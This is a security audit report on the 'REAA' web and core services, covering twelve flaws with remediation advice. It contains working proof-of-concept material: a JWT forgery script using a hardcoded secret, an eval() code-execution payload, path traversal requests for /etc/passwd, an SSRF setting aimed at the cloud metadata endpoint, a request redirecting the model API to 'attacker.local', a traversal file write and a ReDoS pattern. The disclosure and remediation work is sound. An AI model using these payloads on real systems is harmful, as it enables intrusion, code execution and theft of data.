# Cybersecurity Vulnerability Review (REAA)

Date: 2026-04-17  
Scope: `webui/` and `core/` Python services

## Executive Summary

I found multiple high-impact vulnerabilities, including:

1. **Critical**: JWT tokens are signed with a known default secret (`default_secret_key`), allowing token forgery.
2. **High**: Arbitrary code execution via unsafe `eval()` of environment variables.
3. **High**: Unauthenticated API key listing/creation/revocation endpoints.
4. **High**: Path traversal enabling arbitrary file read in file-serving routes.

---

## Findings and PoC

## 1) Predictable JWT secret enables token forgery (Critical)

### Impact
Any attacker who can reach auth-protected endpoints can mint valid JWTs and impersonate users (including admin if user ID is known/guessable).

### Evidence
- `auth_manager = AuthManager()` is created at import time; outside Flask app context, `current_app` is unavailable.
- `AuthManager.__init__` falls back to a static hardcoded secret: `default_secret_key`.
- `webui/app.py` imports `auth_manager` before creating/configuring `Flask` app.

### Affected code
- `webui/auth.py`
- `webui/app.py`

### PoC
```bash
python - <<'PY'
import jwt, datetime
secret = 'default_secret_key'
payload = {
  'user_id': 1,
  'iat': datetime.datetime.utcnow(),
  'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24),
}
print(jwt.encode(payload, secret, algorithm='HS256'))
PY
```

Use produced token:
```bash
curl -s http://127.0.0.1:5000/api/auth/me \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

Expected: request is accepted as user `1` if that account exists and session checks are satisfied.

---

## 2) Remote code execution via `eval()` on env vars (High)

### Impact
If attacker controls environment variables or deployment config (common in CI/CD, container env injection, misconfigured `.env` write access), they can execute arbitrary Python code in backend process.

### Evidence
`core/llm_refiner.py` uses:
- `eval(settings.LLM4DECOMPILE_MAX_MEMORY)`
- `eval(settings.LLM4DECOMPILE_QUANTIZATION)`

### Affected code
- `core/llm_refiner.py`

### PoC
```bash
export LLM4DECOMPILE_MAX_MEMORY="__import__('os').system('touch /tmp/reaa_eval_poc') or {}"
python - <<'PY'
from core.llm_refiner import LLMRefiner
r = LLMRefiner(model_path='dummy-model')
r.load_model()  # eval() executes while building model_kwargs
print('done')
PY
ls -l /tmp/reaa_eval_poc
```

Expected: `/tmp/reaa_eval_poc` is created.

---

## 3) Unauthenticated API key management (High)

### Impact
Anyone can:
- list all API keys,
- create new valid API keys,
- revoke keys.

This completely breaks trust boundaries of remote collaboration/auth flows.

### Evidence
Routes do not use `@token_required` / admin guard:
- `GET /api/remote/api-keys`
- `POST /api/remote/api-keys`
- `DELETE /api/remote/api-keys/<key>`

### Affected code
- `webui/app.py`

### PoC
```bash
# 1) List active keys (no auth)
curl -s http://127.0.0.1:5000/api/remote/api-keys

# 2) Mint a new valid key (no auth)
curl -s -X POST http://127.0.0.1:5000/api/remote/api-keys

# 3) Revoke any key (no auth)
curl -s -X DELETE http://127.0.0.1:5000/api/remote/api-keys/<KEY>
```

Expected: all operations succeed without authentication.

---

## 4) Path traversal in file-read endpoints (High)

### Impact
Arbitrary local file read (sensitive configs, secrets, keys, source code), depending on process permissions.

### Evidence
User-controlled `job_id` / `filename` are directly passed to `os.path.join(...)` and read without canonical path validation.
Examples:
- `/api/jobs/<job_id>/pseudocode/<filename>`
- `/results/<job_id>/function/<addr>/refine`
- `/api/jobs/<job_id>/diff/<filename>`

### Affected code
- `webui/app.py`

### PoC
```bash
curl -s "http://127.0.0.1:5000/api/jobs/demo/pseudocode/../../../../../../etc/passwd"
```

If Flask routing blocks slashes in `<filename>`, URL-encode traversal payload:
```bash
curl -s "http://127.0.0.1:5000/api/jobs/demo/pseudocode/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

Expected: response includes file content from outside intended `data/<job>/artifacts/pseudocode/` directory.

---

## Recommended Remediation (Priority Order)

1. **JWT hardening (Immediate)**
   - Remove hardcoded fallback secret entirely.
   - Inject secret from secure env/secret manager at startup and fail-fast if missing.
   - Rotate existing tokens/sessions.

2. **Remove `eval()` (Immediate)**
   - Replace with strict parsers (`json.loads`, schema validation, explicit dict parsing).
   - Reject invalid types; never execute config as code.

3. **Enforce authz on key management (Immediate)**
   - Require `@token_required` + admin role checks.
   - Audit logs for key operations.

4. **Prevent path traversal**
   - Use allowlisted filenames.
   - Resolve canonical paths and verify they remain under intended base dir (`Path.resolve()` + prefix check).

5. **Defense-in-depth**
   - Add security tests (authz, traversal, token forgery regression tests).
   - Add SAST/DAST checks in CI.


---

## Additional Findings (Round 2)

## 5) Duplicate Socket.IO handlers can bypass intended collaboration controls (High)

### Impact
The same Socket.IO events (`connect`, `disconnect`, `leave_room`) are registered twice. The later handlers are minimal and can override earlier, more restrictive logic depending on registration behavior, leading to inconsistent enforcement and potential bypass of room/user tracking controls.

### Evidence
- First handler set around collaboration control block.
- Same events are registered again near file end with simpler behavior.

### Affected code
- `webui/app.py`

### PoC (behavioral)
```bash
# Start server and connect via Socket.IO client.
# Observe whether room/user bookkeeping events from the first handlers are not emitted
# while the minimal "Client connected" path still executes.
```

### Recommendation
Consolidate to a single handler per event and enforce authentication/authorization in those canonical handlers.

---

## 6) Sensitive administrative/config endpoints exposed without authentication (High)

### Impact
An unauthenticated actor can alter runtime security posture and outbound targets:
- change `GHIDRA_API_BASE` (potential SSRF pivot),
- alter `r2_path`,
- modify model API base/key,
- switch active model.

### Evidence
Endpoints are missing `@token_required` / `@admin_required`:
- `POST /api/settings`
- `POST /api/models/switch`
- `POST /api/models/config`
- `POST /api/models/test`
- `POST /api/r2/test`

### Affected code
- `webui/app.py`

### PoC
```bash
# No Authorization header required
curl -s -X POST http://127.0.0.1:5000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"ghidra_url":"http://169.254.169.254/latest/meta-data/", "r2_path":"/usr/bin/radare2"}'

curl -s -X POST http://127.0.0.1:5000/api/models/config \
  -H 'Content-Type: application/json' \
  -d '{"api_base":"http://attacker.local:8080", "api_key":"leakme"}'
```

### Recommendation
Require admin authorization for all settings/model management endpoints and validate outbound host allowlist.

---

## 7) Default admin credential fallback in migration script (Medium)

### Impact
If deployment runs migration without secure env overrides, predictable admin credentials (`admin`/`admin123`) may be created, allowing immediate account takeover.

### Evidence
- `ADMIN_USERNAME` defaults to `admin`.
- `ADMIN_PASSWORD` defaults to `admin123`.

### Affected code
- `webui/migrate_data.py`

### PoC
```bash
# In a fresh deployment without ADMIN_PASSWORD env override:
python webui/migrate_data.py
# Then login with admin/admin123
```

### Recommendation
Fail startup/migration when admin password is unset; require one-time bootstrap secret flow.

---

## 8) Information disclosure through raw exception messages (Medium)

### Impact
Many API routes return `str(e)` directly to clients, exposing stack/context details and internal paths/config that can assist follow-on attacks.

### Evidence
Multiple handlers return JSON errors with raw exception strings.

### Affected code
- `webui/app.py`

### PoC
```bash
# Trigger malformed request bodies or invalid params and inspect response:
curl -s -X POST http://127.0.0.1:5000/api/models/switch -H 'Content-Type: application/json' -d '{}'
```

### Recommendation
Return generic client-safe error messages and log detailed exceptions server-side only.

---

## 9) Unbounded file upload can lead to memory/resource exhaustion (Medium)

### Impact
`/upload` reads entire uploaded file into memory (`file.read()`) without visible max-size enforcement, enabling memory exhaustion DoS.

### Evidence
- Endpoint reads full file contents in one call.
- No visible `MAX_CONTENT_LENGTH` enforcement in Flask config.

### Affected code
- `webui/app.py`

### PoC
```bash
# Upload very large file repeatedly to induce high memory usage
curl -F "file=@/path/to/large.bin" http://127.0.0.1:5000/upload
```

### Recommendation
Set `MAX_CONTENT_LENGTH`, stream uploads, and apply rate-limiting/WAF rules.


---

## Additional Findings (Round 3 - Deep Dive)

## 10) Arbitrary file write via unsanitized uploaded filename in core service (High)

### Impact
`/analyze` and `/analyze_b64` pass user-controlled `filename` into `_launch_analysis`, which writes bytes to `proj_dir / filename` without canonicalization. A crafted filename with traversal components (e.g., `../../...`) can write outside the intended job directory.

### Evidence
- Upload endpoints pass filename directly.
- `_launch_analysis` writes `binary_path = proj_dir / filename` and `binary_path.write_bytes(contents)`.

### Affected code
- `core/app.py`

### PoC
```bash
curl -s -X POST http://127.0.0.1:8000/analyze_b64 \
  -H 'Content-Type: application/json' \
  -d '{"file_b64":"QQ==","filename":"../../tmp/reaa_core_traversal.bin"}'

# Check whether /tmp/reaa_core_traversal.bin was created by service account
```

### Recommendation
Normalize and validate filename (`os.path.basename` + allowlist), resolve target path, and enforce target under per-job directory.

---

## 11) ReDoS risk from user-controlled regex queries (Medium)

### Impact
`/query` supports user-supplied regex (`regex=true`) and executes `re.search()` over potentially large artifact text without timeout/complexity limits. Crafted catastrophic regex can consume CPU and degrade availability.

### Evidence
- User controls `query` and `regex` flags.
- Direct `re.search(q, text, re.IGNORECASE)` in request path.

### Affected code
- `core/app.py`

### PoC
```bash
curl -s -X POST http://127.0.0.1:8000/query \
  -H 'Content-Type: application/json' \
  -d '{"job_id":"<valid_job>","regex":true,"query":"(a+)+$"}'
```

(Use long crafted inputs in artifacts to observe CPU spikes.)

### Recommendation
Use safe-regex validation, input length limits, and regex execution guardrails/timeouts.

---

## 12) Core API has no authentication/authorization gates (High when exposed)

### Impact
Core endpoints (`/analyze`, `/jobs`, `/status/*`, `/results/*`, `/query`, `/tools/*`) appear publicly callable with no auth checks. If this service is network-exposed beyond trusted internal network, attackers can queue jobs, read analysis data, and trigger expensive operations.

### Evidence
- No auth dependency/middleware/decorators on endpoints in `core/app.py`.

### Affected code
- `core/app.py`

### PoC
```bash
# Unauthenticated job listing
curl -s http://127.0.0.1:8000/jobs

# Unauthenticated query
curl -s -X POST http://127.0.0.1:8000/query -H 'Content-Type: application/json' -d '{"job_id":"<id>","query":"password"}'
```

### Recommendation
Require service authentication (API key/JWT/mTLS), apply RBAC, and restrict network exposure.

